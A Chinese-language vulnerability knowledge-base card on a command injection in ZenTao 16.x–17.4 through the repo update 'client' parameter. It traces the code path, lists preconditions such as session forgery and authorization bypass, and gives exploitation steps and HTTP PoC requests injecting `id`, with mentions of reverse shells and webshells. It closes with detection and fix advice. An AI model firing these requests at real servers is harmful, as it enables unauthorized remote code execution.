---
id: web-php-rce-zentao-repo-svn-client-command-injection
title: 禅道 16.x–17.4 repo 更新 SCM=Subversion：client 参数经 setEngine/getSVNVersion 拼入 exec 命令注入
type: scenario
domain: web
path: web/php/rce
technique: zentao-repo-svn-client-command-injection
tags:
- php
- zentao
- command-injection
- rce
- repo
- svn
- session
cve: []
severity: critical
confidence: medium
affected_versions: 16.x–17.4
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V635
  verified_at: '2026-11-13T01:08:36+08:00'
  notes: 已对照原文与 img/09,10,11 核对：repoModel::update 在 SCM=Subversion 且 path != repo->path 时 setEngine；Subversion 构造函数拼接 client/account/password（remote 时追加 --username/--password），getSVNVersion 执行 "$client --version --quiet 2>&1" 的 exec；原文明确影响 16.x–17.4，与 affected_versions 一致。原文未定位回显，卡内按盲打描述，PoC 重建未执行。dedup_review 理由成立：与既有 verified 卡 checkconnection-exec（18.x–20.x，checkConnection sink）为版本区间与内部触发函数不同的变体，非同一条原文链路；dup-scan 无 pair。
url: /docs/web/php/rce/web-php-rce-zentao-repo-svn-client-command-injection/
draft: false
kb_aliases:
- 禅道 repo 命令注入
- zentao SCM Subversion exec
- 禅道 16.0 RCE
- 禅道 setEngine getSVNVersion
- ZenTao repo RCE
---

## 一句话结论

16.x–17.4 的 `repoModel::update($id)` 接受 POST 的 `SCM`、`client`、`account`、`password` 等字段，当 `SCM=Subversion` 且 `path` 变化时调用 `scm->setEngine($data)` 实例化 Subversion 驱动；构造函数把 `client`/`account`/`password` 拼进 `$client --version --quiet 2>&1` 交给 `exec()`，`client` 可注入反引号/分号/管道，从而在服务器执行任意命令。

## 原理

- **入口**：`module/repo/model.php update($id)` 用 `fixer::input('post')` 收集 data，`setDefault('client','svn')`，并对 `path,client,account,password` 调用 `skipSpecial()`——这四个字段不做特殊字符过滤。当 `$data->SCM == 'Subversion' and $data->path != $repo->path` 时执行 `$scm = $this->app->loadClass('scm'); $scm->setEngine($data);`。
- **驱动实例化**：`scm` 类按 `$data->SCM` 创建对应驱动（`lib/scm/subversion.class.php`）。Subversion 驱动构造函数：`$this->client = $this->remote ? $this->client . " --username $account --password $password" : $client;`，随后 `$this->svnVersion = $this->getSVNVersion($client);`。
- **sink**：`getSVNVersion($client)` 执行 `$versionCommand = "$client --version --quiet 2>&1"; exec($versionCommand, $versionOutput, $versionResult);`。`$client` 来自 POST 且未转义，`;`、`|`、反引号、`$()` 均可截断/追加命令。
- **为什么先建仓库**：update 需要已存在的仓库 id；create 分支对 SCM 有校验（`SCM=Gitlab` 走服务端 API 校验可通过），所以先以 Gitlab 建仓库，再 update 为 Subversion，使 `skipSpecial` 放行的字段进入命令拼接。
- **为什么能调用**：16.x 靠 `programPriv->waterfall` 白名单越权，17.x 靠 `deny()` 异常不退出或伪造会话，把未授权用户送进 repo 模块。
- **回显**：命令输出写入 `$versionOutput`，原文未定位回显点，按盲打处理（DNS/反连/写文件）；PHP 命令执行回显手段多，不影响危害成立。
- **边界**：具体字段名与路由随版本略有差异；修复版本对 client 做了校验后失效。

## 触发条件

- 16.x–17.4 禅道；repo 模块启用；PHP 未禁用 `exec`。
- 具备 repo 模块访问（16.x waterfall 越权或 17.x 鉴权绕过/伪造会话）。
- `client` 可以是任意命令前缀（不要求目标安装 svn）。

## 利用步骤

1. 伪造会话（`misc-captcha-user.html`）或完成鉴权绕过。
2. 创建仓库：POST `repo-create`，`SCM=Gitlab`，记录返回的仓库 id。
3. 更新仓库：POST `repo-edit-<id>-<id>.html`（或 `index.php?m=repo&f=edit&id=<id>`），提交 `SCM=Subversion&client=`id``；也可把注入放到 `account`/`password`。
4. 用反连/写文件命令验证执行；需要回显时结合写 webshell 或反弹 shell。

## PoC

```http
POST /zentao/repo-create.html HTTP/1.1
Host: target
Cookie: zentaosid=<伪造会话>
Content-Type: application/x-www-form-urlencoded

product%5B%5D=1&SCM=Gitlab&name=test&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid=
```

```http
POST /zentao/repo-edit-<id>-<id>.html HTTP/1.1
Host: target
Cookie: zentaosid=<伪造会话>
Content-Type: application/x-www-form-urlencoded

SCM=Subversion&client=`id`
```

```text
预期：update 进入 setEngine → Subversion 构造函数 → getSVNVersion，
exec 执行 `id` --version --quiet 2>&1；原文未定位回显，按盲打用反连/写文件验证。
（具体字段与路由随版本略有差异，PoC 为依据原文代码重建，未在真实目标执行。）
```

## 变体与关联

- 18.x–20.x 同一 sink 换由 `repoModel::checkConnection()` 触发（create Gitlab 过 checkClient、edit 改 Subversion 注入 client）：[[web-php-rce-zentao-captcha-session-repo-checkconnection-exec]]。
- 其它 SCM 分支（Git/Gitea/Gogs）同样把 client/path 拼进命令行，只是校验不同；Subversion 分支最容易注入。
- 进入 repo 的越权层：16.x 见 [[web-generic-auth-zentao-programpriv-waterfall-modules-bypass]]，17.x 见 [[web-generic-auth-zentao-endresponse-exception-deny-continue]]；前置会话伪造见 [[web-generic-auth-zentao-misc-captcha-session-user-forgery]]。
- 另一条前台 RCE 路径是 api debug 文件包含：[[web-php-file-inclusion-zentao-api-debug-getmethod-basename-bypass]]。

## 检测与防御

- 检测：`repo-edit`/`repo-update` 请求体出现 `SCM=Subversion` 且 `client`（或 account/password）含反引号、`;`、`|`、`$()`；Web 进程派生 `sh -c <client> --version` 子进程；未登录会话直接访问 repo 接口。
- 修复：`client` 只允许固定值（`svn`/`git` 等）并 `escapeshellarg`；`account`/`password` 同样不得直接拼接；`exec` 这类调用改为参数化或使用 `proc_open` 数组形式。
- 加固：`disable_functions` 去掉 `exec/shell_exec/system`；repo 功能仅管理员可用并加二次确认；审计 `openMethods`/`programPriv` 白名单。
